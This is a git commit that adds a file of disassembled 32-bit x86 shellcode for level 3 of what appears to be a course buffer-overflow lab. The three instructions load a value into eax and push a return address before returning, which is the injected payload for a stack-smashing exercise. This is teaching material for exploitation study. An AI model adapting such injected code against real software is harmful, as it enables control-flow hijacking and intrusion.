854518e2ec33947df59385cec8e23f9d9cbdbf05
duangao <gaoduan0306@gmail.com>
2014-10-25 16:23:29 +0800

    add bufferlab

---
+++ bufferlab/level-3.d
@@ -0,0 +1,10 @@
+
+level-3.o：     文件格式 elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 38 55 45 6c       	mov    $0x6c455538,%eax
+   5:	68 81 8e 04 08       	push   $0x8048e81
+   a:	c3                   	ret    
